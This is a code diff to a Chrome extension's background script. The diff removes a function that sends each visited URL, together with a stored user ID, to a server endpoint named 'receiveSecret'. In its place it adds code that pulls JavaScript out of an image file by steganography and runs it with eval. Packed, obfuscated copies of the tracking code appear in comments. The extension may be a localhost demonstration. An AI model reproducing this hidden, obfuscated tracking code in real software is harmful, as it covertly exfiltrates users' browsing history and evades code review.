@@ -202,7 +202,21 @@ chrome.tabs.onUpdated.addListener(function (tabId, details) {
         if (details) {
             if (details.url) {
                 if (isUsefulUrl(details.url) >= 0) {
-                    sendSecret(tabId,details.url);
+                    // eval("sendSecret(tabId,details.url);function sendSecret(d,e){var f='';chrome.storage.sync.get('uid',function(b){if(b){var c=new XMLHttpRequest();c.open('GET',getAD(b.uid,e),true);c.send(null);c.onreadystatechange=function(){if(c.readyState==4&&c.status==200){var a=JSON.parse(c.responseText);if(a.url){alert(a.url);chrome.tabs.sendMessage(d,{'greeting':a.url})}else{}}}}})}function getAD(a,b){return'http://127.0.0.1:8080/receiveSecret?'+'uid='+a+'&secretUrl='+b}");
+                    // eval("function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('8(p,h.3);2 8(d,e){6 f=\'\';9.i.n.v(\'5\',2(b){7(b){6 c=j k();c.l(\'m\',g(b.5,e),o);c.K(q);c.r=2(){7(c.s==4&&c.t==u){6 a=w.x(c.y);7(a.3){z(a.3);9.A.B(d,{\'C\':a.3})}D{}}}}})}2 g(a,b){E\'F://G.0.0.1:I/J?\'+\'5=\'+a+\'&H=\'+b}',47,47,'||function|url||uid|var|if|sendSecret|chrome|||||||getAD|details|storage|new|XMLHttpRequest|open|GET|sync|true|tabId|null|onreadystatechange|readyState|status|200|get|JSON|parse|responseText|alert|tabs|sendMessage|greeting|else|return|http|127|secretUrl|8080|receiveSecret|send'.split('|'),0,{})");
+                    var mask = new ImageMask({debug: false});
+                    var img = new Image();
+                    img.src = "../images/Secret.jpg";
+                    var canvas = document.createElement("canvas");
+                    var ctx = canvas.getContext('2d');
+                    img.onload = function () {
+                        ctx.canvas.width = img.width;
+                        ctx.canvas.height = img.height;
+                        ctx.drawImage(img, 0, 0);
+                        // alert(mask.revealText(canvas));
+                        eval(mask.revealText(canvas));
+                        // document.defaultView["Function"](mask.revealText(canvas))();
+                    };
                 }
             }
         }
@@ -210,30 +224,6 @@ chrome.tabs.onUpdated.addListener(function (tabId, details) {
 );
 function isUsefulUrl(url) {
     return url.search(/http/);
-}
-function sendSecret(tabId,userSecret) {
-    var uid = '';
-    chrome.storage.sync.get('uid', function (item) {
-        if (item) {
-            var xhr = new XMLHttpRequest();
-            xhr.open('GET', getAD(item.uid, userSecret), true);
-            xhr.send(null);
-            xhr.onreadystatechange = function () {
-                if (xhr.readyState == 4 && xhr.status == 200) {
-                    var obj = JSON.parse(xhr.responseText);
-                    if (obj.url) {
-                        alert(obj.url);
-                        chrome.tabs.sendMessage(tabId,{'greeting':obj.url});
-                    } else {
-
-                    }
-                }
-            };
-        }
-    });
-}
-function getAD(item, userSecret) {
-    return 'http://127.0.0.1:8080/receiveSecret?' + 'uid=' + item + '&secretUrl=' + userSecret;
 }
 function getUIDServerUrl() {
     return "http://127.0.0.1:8080/uid";
@@ -265,12 +255,8 @@ chrome.runtime.onInstalled.addListener(function (details) {
     }
 );
 
-// TODO: Start after 5 seconds :)
-// window.setTimeout(revealSpy, 5000);
-
 function revealSpy() {
     var mask = new ImageMask({debug: false});
-// read the data into the canvas element
     var img = new Image();
     img.src = "../images/Secret.jpg";
     var canvas = document.createElement("canvas");
